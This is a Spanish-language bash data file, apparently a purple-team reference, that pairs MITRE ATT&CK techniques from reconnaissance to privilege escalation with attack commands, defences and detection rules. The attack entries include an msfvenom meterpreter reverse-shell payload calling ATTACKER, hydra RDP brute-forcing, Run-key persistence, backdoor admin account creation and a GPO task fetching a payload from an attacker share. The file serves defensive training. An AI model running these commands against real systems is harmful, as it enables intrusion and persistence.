#!/bin/bash
# Extensión de mitre_data.sh - Parte 1

# TA0043 - Reconnaissance
PURPLE_DATA["T1595"]="
📝 DESCRIPCIÓN: Escaneo activo (Active Scanning) en busca de puertos, servicios y vulnerabilidades.
|||
🔴 ATAQUE — Active Scanning:
  • nmap -sS -sV -p- TARGET
  • nuclei -u https://TARGET -t cves/
  • masscan -p80,443,8080 TARGET --rate=1000
|||
🔵 DEFENSA:
  • WAF con límite de tasa (Rate Limiting).
  • Implementar port knocking, bloquear escáneres comunes en edge firewall.
|||
🟣 DETECCIÓN:
  • IPS/IDS: Alerta de barrido de puertos desde IP origen.
  • Firewall Logs: >100 conexiones rehusadas (RST) en <1min."

PURPLE_DATA["T1592"]="
📝 DESCRIPCIÓN: Recolección de información sobre la tecnología usada por el objetivo.
|||
🔴 ATAQUE — Gather Victim Host Info:
  • whatweb https://TARGET
  • wafw00f https://TARGET
  • curl -I https://TARGET (análisis de Server headers)
|||
🔵 DEFENSA:
  • Eliminar banners y firmas de Server/OS (ServerTokens Prod).
  • Ofuscar cabeceras HTTP que revelen versiones.
|||
🟣 DETECCIÓN:
  • WAF: Detectar User-Agents específicos como 'whatweb' o 'curl'.
  • IPS: Alertas por solicitudes de descubrimiento de versionado."

PURPLE_DATA["T1589"]="
📝 DESCRIPCIÓN: Recolección de información sobre la identidad de las víctimas (emails, nombres).
|||
🔴 ATAQUE — Gather Victim Identity Info:
  • theHarvester -d TARGET -b linkedin,google
  • infoga --domain TARGET --source all
  • h8mail -t \"*@TARGET\"
|||
🔵 DEFENSA:
  • Limitar la exposición de correos en la web pública.
  • Políticas de privacidad estrictas en redes sociales del personal.
|||
🟣 DETECCIÓN:
  • Alertas de búsquedas masivas de directorios LDAP si es interno.
  • Difícil detección en red externa (OSINT pasivo)."

PURPLE_DATA["T1591"]="
📝 DESCRIPCIÓN: Información de la organización (estructura, subsidiarias, roles).
|||
🔴 ATAQUE — Gather Victim Org Info:
  • Búsqueda en LinkedIn y secuencias de dorks en Google (site:TARGET intitle:\"organigrama\").
  • dnsrecon -d TARGET -t axfr
|||
🔵 DEFENSA:
  • Deshabilitar transferencias de zona DNS (AXFR).
|||
🟣 DETECCIÓN:
  • DNS Logs: Intentos fallidos de AXFR (Zone Transfer).
  • Accesos inusuales de scrapers a la web corporativa."

PURPLE_DATA["T1598"]="
📝 DESCRIPCIÓN: Phishing para la obtención de información y credenciales.
|||
🔴 ATAQUE — Phishing for Information:
  • gophish configurado con página clonada apuntando a usuarios de TARGET.
  • Enviar correo solicitando confirmación de credenciales a @TARGET.
|||
🔵 DEFENSA:
  • Filtros anti-spam, políticas DMARC/SPF en TARGET.
  • MFA requerido para evitar uso de credenciales capturadas.
|||
🟣 DETECCIÓN:
  • Reportes de usuarios al equipo SOC.
  • Correlación de clics en URLs sospechosas captadas por el proxy web."

# TA0042 - Resource Development
PURPLE_DATA["T1583"]="
📝 DESCRIPCIÓN: Adquisición de infraestructura (dominios, VPS, botnets) para ataques.
|||
🔴 ATAQUE — Acquire Infrastructure:
  • Compra de dominios typo-squatting (ej. TARG3T.com).
  • Creación de VPS en proveedores bulletproof listos para lanzar vs TARGET.
|||
🔵 DEFENSA:
  • Registrar dominios similares al de la empresa defensivamente.
|||
🟣 DETECCIÓN:
  • Threat Intel: Monitoreo de Whois sobre registros nuevos similares a TARGET."

PURPLE_DATA["T1584"]="
📝 DESCRIPCIÓN: Comprometer infraestructura de terceros para usarla como pivote.
|||
🔴 ATAQUE — Compromise Infrastructure:
  • Explotar un WordPress de terceros y subir una webshell para atacar a TARGET desde allí.
|||
🔵 DEFENSA:
  • Bloquear tráfico entrante de IPs con mala reputación (Threat Intelligence Feeds).
|||
🟣 DETECCIÓN:
  • Firewalls detectando escaneos o ataques desde IPs de hosting residencial/comprometido."

PURPLE_DATA["T1608"]="
📝 DESCRIPCIÓN: Preparación de capacidades (payloads, malware, perfiles C2).
|||
🔴 ATAQUE — Stage Capabilities:
  • Subir malware a pastebin o ngrok para descargarlo desde TARGET.
  • python3 -m http.server 80 (sirviendo payload a TARGET).
|||
🔵 DEFENSA:
  • Restringir salida a internet (Egress filtering) en servidores críticos de TARGET.
|||
🟣 DETECCIÓN:
  • Proxy Logs: Conexiones a Pastebin, GitHub raw, ngrok o IPs sin dominio desde servidores de TARGET."

PURPLE_DATA["T1587"]="
📝 DESCRIPCIÓN: Desarrollo de capacidades (armado de exploits, malware a medida).
|||
🔴 ATAQUE — Develop Capabilities:
  • msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER LPORT=443 -f exe > payload_TARGET.exe
  • Compilación de un packer para evadir AV.
|||
🔵 DEFENSA:
  • Carga de Firmas y Sandboxing (EDR / ATP).
|||
🟣 DETECCIÓN:
  • Antivirus heurístico deteniendo el payload personalizado al intentar ejecutarlo en TARGET."

PURPLE_DATA["T1586"]="
📝 DESCRIPCIÓN: Compromiso de cuentas (redes sociales, emails personales) usadas como vector.
|||
🔴 ATAQUE — Compromise Accounts:
  • Crackear contraseñas recicladas usadas por empleados de TARGET.
|||
🔵 DEFENSA:
  • Bloquear autenticación si la contraseña está en bases de datos de brechas (HaveIBeenPwned).
|||
🟣 DETECCIÓN:
  • Monitoreo de Threat Intel y credenciales expuestas en la Dark Web."

# TA0001 - Initial Access
PURPLE_DATA["T1133"]="
📝 DESCRIPCIÓN: Acceso externo a través de servicios remotos (VPN, RDP, SSH) de la organización.
|||
🔴 ATAQUE — External Remote Services:
  • hydra -l admin -P rockyou.txt rdp://TARGET
  • Explotación de VPN (Ej. CVE-2024-3400 en GlobalProtect de TARGET)
|||
🔵 DEFENSA:
  • Requerir MFA en VPN y RDP externo siempre.
  • Aplicar parches críticos <24h para gateways VPN.
|||
🟣 DETECCIÓN:
  • VPN Logs: Múltiples intentos fallidos de Auth.
  • Geolocation anomalies: Inicio de sesión válido desde país inusual."

PURPLE_DATA["T1195"]="
📝 DESCRIPCIÓN: Compromiso de la cadena de suministro (Software de terceros, librerías).
|||
🔴 ATAQUE — Supply Chain Compromise:
  • Publicar paquete malicioso en npm/PyPI con nombre similar a módulo interno de TARGET.
|||
🔵 DEFENSA:
  • Repositorios de dependencias locales (Artifactory) con escaneo SCA.
|||
🟣 DETECCIÓN:
  • Herramientas SCA (Software Composition Analysis) detectando hash de dependencias maliciosas."

# TA0002 - Execution
PURPLE_DATA["T1204"]="
📝 DESCRIPCIÓN: Ejecución por parte de un usuario (clicar un link o abrir un documento).
|||
🔴 ATAQUE — User Execution:
  • Enviar documento .LNK camuflado o .DOCX con macros maliciosas a usuario de TARGET.
|||
🔵 DEFENSA:
  • MoTW (Mark of the Web) en Windows. Bloquear macros de archivos de internet (GPO).
|||
🟣 DETECCIÓN:
  • Sysmon Event ID 1: mshta.exe o powershell.exe lanzado desde winword.exe o excel.exe."

PURPLE_DATA["T1047"]="
📝 DESCRIPCIÓN: Instrumentación de administración de Windows (WMI) para ejecución de código.
|||
🔴 ATAQUE — WMI:
  • wmic /node:TARGET process call create \"cmd.exe /c payload.exe\"
  • wmiexec.py user:pass@TARGET 'whoami'
|||
🔵 DEFENSA:
  • Restringir WMI y RPC (puerto 135) a subredes de administración.
|||
🟣 DETECCIÓN:
  • Event ID 4688: wmic.exe process call create.
  • Event ID 5861: Actividad sospechosa de WMI registrada."

PURPLE_DATA["T1106"]="
📝 DESCRIPCIÓN: Ejecutar payloads mediante llamadas directas a la API nativa del SO.
|||
🔴 ATAQUE — Native API:
  • Shellcode de inyección invocando CreateThread, VirtualAllocEx.
|||
🔵 DEFENSA:
  • Soluciones EDR basadas en hooking de API de usuario y kernel callbacks.
|||
🟣 DETECCIÓN:
  • EDR: Detección de syscalls directas (Syswhispers) que puentean ntdll.dll."

# TA0003 - Persistence
PURPLE_DATA["T1547"]="
📝 DESCRIPCIÓN: Ejecución de malware automáticamente en el inicio del sistema (Registro, Startup, Servicios).
|||
🔴 ATAQUE — Boot or Logon Autostart:
  • reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\payload.exe\" /f (en TARGET)
|||
🔵 DEFENSA:
  • Restringir perfiles de usuarios. WDAC y AppLocker.
|||
🟣 DETECCIÓN:
  • Sysmon Event ID 12/13/14: Creaciones de llaves de registro de Autorun.
  • Autoruns de Sysinternals (verificación de anomalías)."

PURPLE_DATA["T1505"]="
📝 DESCRIPCIÓN: Webshells o módulos instalados en IIS/Apache como persistencia.
|||
🔴 ATAQUE — Server Software Component:
  • Subir a TARGET: cmd.aspx o shell.jsp en un directorio público.
|||
🔵 DEFENSA:
  • Monitoreo de integridad de archivos (FIM) en directorios web raíz (wwwroot).
|||
🟣 DETECCIÓN:
  • EDR/FIM: Creación de archivo .php/.jsp/.aspx no programada por desarrollo.
  • Web Logs: Access logs hacia un archivo sospechoso recién creado."

PURPLE_DATA["T1136"]="
📝 DESCRIPCIÓN: Creación de cuentas locales o de dominio para retener el acceso.
|||
🔴 ATAQUE — Create Account:
  • net user backdoor P@ssw0rd123 /add (en TARGET)
  • net localgroup administrators backdoor /add (en TARGET)
|||
🔵 DEFENSA:
  • Políticas estrictas de auditoría LDAP y grupos locales en endpoints vía LAPS.
|||
🟣 DETECCIÓN:
  • Event ID 4720: Cuenta de usuario creada.
  • Event ID 4732: Miembro añadido a grupo local con privilegios."

# TA0004 - Privilege Escalation
PURPLE_DATA["T1548"]="
📝 DESCRIPCIÓN: Abuso del Control de Elevación (Bypass UAC o Sudo).
|||
🔴 ATAQUE — Abuse Elevation Control:
  • sdclt.exe exec (Bypass UAC en Windows)
  • sudo -u root /bin/bash (si tiene permisos NOPASSWD en TARGET)
|||
🔵 DEFENSA:
  • Configurar UAC en su nivel más estricto (Always Notify).
  • Auditar archivos sudoers para evitar comodines o NOPASSWD.
|||
🟣 DETECCIÓN:
  • Sysmon ID 1: Proceso que pide elevación sin GUI en paths usuales (fodhelper.exe, sdclt.exe).
  • Auditd en Linux: Modificaciones a archivos en /etc/sudoers.d/."

PURPLE_DATA["T1134"]="
📝 DESCRIPCIÓN: Manipulación de Tokens de Acceso para suplantar procesos privilegiados.
|||
🔴 ATAQUE — Access Token Manipulation:
  • meterpreter > incognito > impersonate_token \"NT AUTHORITY\\SYSTEM\" (en TARGET)
|||
🔵 DEFENSA:
  • Limitar el derecho \"SeDebugPrivilege\" e \"Impersonate a client after auth\" sólo a Admins autorizados.
|||
🟣 DETECCIÓN:
  • EDR: Alerta de intento de robo de token de lsass o winlogon.
  • Event ID 4672: Asignación de privilegios especiales a un login nuevo."

PURPLE_DATA["T1068"]="
📝 DESCRIPCIÓN: Explotación de vulnerabilidades locales para escalar privilegios.
|||
🔴 ATAQUE — Exploitation for Privilege Escalation:
  • winPEAS.exe para buscar rutas vulnerables (en TARGET).
  • CVE-2024-30051 exploit: lpe_exploit.exe ejecutado en TARGET obteniendo SYSTEM.
|||
🔵 DEFENSA:
  • Gestión de parches del Sistema Operativo (Patch Management).
|||
🟣 DETECCIÓN:
  • EDR: Comportamiento heurístico de un proceso normal inyectando a SYSTEM o generando cmd.exe como SYSTEM."

PURPLE_DATA["T1484"]="
📝 DESCRIPCIÓN: Modificación de Políticas de Dominio (GPO) para desplegar malware a la red.
|||
🔴 ATAQUE — Domain Policy Modification:
  • Añadir una Scheduled Task a través de Group Policy apuntando a \\\\attacker\\payload.exe (contra DC de TARGET).
|||
🔵 DEFENSA:
  • Sistema de gobierno de GPOs con aprobación múltiple (AGPM).
|||
🟣 DETECCIÓN:
  • Event ID 5136: Objeto de servicios de directorio modificado (GPC).
  • Auditoría nativa de cambios en Políticas de Grupo de AD."
